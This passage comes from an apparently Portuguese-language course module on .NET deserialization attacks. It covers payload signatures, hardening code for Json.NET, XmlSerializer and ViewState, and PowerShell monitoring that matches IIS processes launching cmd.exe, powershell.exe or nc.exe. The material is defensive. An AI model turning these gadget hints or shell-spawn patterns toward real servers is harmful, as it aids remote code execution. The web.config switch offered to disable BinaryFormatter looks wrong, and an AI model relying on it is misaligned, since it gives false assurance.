AAEAAAD/////

# XmlSerializer payload
ExpandedWrapperOf
XamlReader
```

### Prevencao

**1. Nao usar BinaryFormatter:**

```xml
<!-- web.config - desabilitar BinaryFormatter -->
<runtime>
  <AppContextSwitchOverrides value="Switch.System.Runtime.Serialization.SerializationGuard.AllowSimpleTemporalValues=false" />
</runtime>
```

**2. Json.NET — configurar TypeNameHandling.None:**

```csharp
// NUNCA usar TypeNameHandling.All ou TypeNameHandling.Objects
// com dados nao confiaveis

var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.None,
    SerializationBinder = new DefaultSerializationBinder()
};

// Se precisar de polimorfismo, usar SerializationBinder para whitelist
public class SafeSerializationBinder : DefaultSerializationBinder {
    private static readonly HashSet<string> AllowedTypes = new HashSet<string> {
        "MyApp.Models.User",
        "MyApp.Models.Order"
    };
    
    public override Type BindToType(string assemblyName, string typeName) {
        if (!AllowedTypes.Contains(typeName))
            throw new InvalidOperationException($"Tipo nao permitido: {typeName}");
        return base.BindToType(assemblyName, typeName);
    }
}
```

**3. XmlSerializer — tipo fixo no codigo:**

```csharp
// Vulneravel — tipo controlado pelo usuario
Type type = Type.GetType(Request["type"]);
XmlSerializer xs = new XmlSerializer(type);

// Seguro — tipo fixo
XmlSerializer xs = new XmlSerializer(typeof(MyModel));
var obj = (MyModel)xs.Deserialize(xmlReader);
```

**4. ViewState — habilitar MAC:**

```xml
<!-- web.config -->
<system.web>
  <pages enableViewStateMac="true" viewStateEncryptionMode="Always" />
  <machineKey 
    validationKey="AUTO,IsolateApps" 
    decryptionKey="AUTO,IsolateApps"
    validation="HMACSHA256" />
</system.web>
```

**5. Usar serializadores seguros:**

```csharp
// DataContractSerializer — nao tem gadgets nativos
var dcs = new DataContractSerializer(typeof(MyModel));
var obj = (MyModel)dcs.ReadObject(xmlReader);

// System.Text.Json — seguro por padrao
var obj = System.Text.Json.JsonSerializer.Deserialize<MyModel>(json);
```

### Monitoramento

```powershell
# Monitorar processos filhos do IIS
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1} |
  Where-Object { $_.Message -match 'w3wp|aspnet_wp' } |
  Select-Object TimeCreated, Message

# Monitorar comandos execucao suspeita via IIS
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} |
  Where-Object { $_.Message -match 'cmd.exe|powershell.exe|nc.exe' } |
  Where-Object { $_.Message -match 'Parent.*w3wp' }

# Monitorar conexoes de rede saindo do IIS
netstat -b -f | findstr "w3wp"
```

---

## Módulos Relacionados

`01_deserialization_intro.md` cobre os fundamentos de desserialização em PHP e Python, incluindo magic methods e `__reduce__`. `10_http_attacks/02_http_misconfigs.md` trata do ViewState como vetor de transporte de payload malicioso em aplicações ASP.NET. `11_apis_avancado/01_rest_api_attacks.md` detalha endpoints de API que expõem desserialização insegura via JSON com TypeNameHandling configurado incorretamente.
